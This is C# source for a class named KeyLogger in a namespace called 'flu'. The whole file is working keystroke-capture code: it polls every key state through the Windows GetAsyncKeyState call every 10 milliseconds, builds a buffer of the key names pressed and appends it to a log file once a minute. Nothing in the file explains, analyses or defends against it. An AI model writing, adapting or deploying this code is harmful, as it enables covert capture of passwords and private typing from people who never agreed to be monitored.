using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Timers;
using System.Windows.Forms;

namespace flu;

public class KeyLogger
{
	private string keybuffer;

	private Timer CheckKey;

	private Timer FlushBuffer;

	private string file;

	public bool Enabled
	{
		get
		{
			if (CheckKey.Enabled)
			{
				return FlushBuffer.Enabled;
			}
			return false;
		}
		set
		{
			CheckKey.Enabled = value;
			FlushBuffer.Enabled = value;
		}
	}

	public double FlushInterval
	{
		get
		{
			return FlushBuffer.Interval;
		}
		set
		{
			FlushBuffer.Interval = value;
		}
	}

	public double CheckInterval
	{
		get
		{
			return CheckKey.Interval;
		}
		set
		{
			CheckKey.Interval = value;
		}
	}

	public string File
	{
		get
		{
			return file;
		}
		set
		{
			file = value;
		}
	}

	[DllImport("user32.dll")]
	private static extern short GetAsyncKeyState(Keys vKey);

	[DllImport("user32.dll")]
	private static extern short GetAsyncKeyState(int vKey);

	public KeyLogger(string filename)
	{
		keybuffer = string.Empty;
		File = filename;
		CheckKey = new Timer();
		CheckKey.Enabled = true;
		CheckKey.Elapsed += CheckKey_Elapsed;
		CheckKey.Interval = 10.0;
		FlushBuffer = new Timer();
		FlushBuffer.Enabled = true;
		FlushBuffer.Elapsed += FlushBuffer_Elapsed;
		FlushBuffer.Interval = 60000.0;
	}

	private void CheckKey_Elapsed(object sender, ElapsedEventArgs e)
	{
		foreach (int value in Enum.GetValues(typeof(Keys)))
		{
			if (GetAsyncKeyState(value) == -32767)
			{
				keybuffer = keybuffer + Enum.GetName(typeof(Keys), value) + " ";
			}
		}
	}

	private void FlushBuffer_Elapsed(object sender, ElapsedEventArgs e)
	{
		Flush2File(file, append: true);
	}

	public void Flush2File(string file, bool append)
	{
		try
		{
			StreamWriter streamWriter = new StreamWriter(file, append);
			streamWriter.WriteLine(keybuffer + "\r\n");
			streamWriter.Close();
			keybuffer = string.Empty;
		}
		catch (Exception ex)
		{
			throw ex;
		}
	}
}
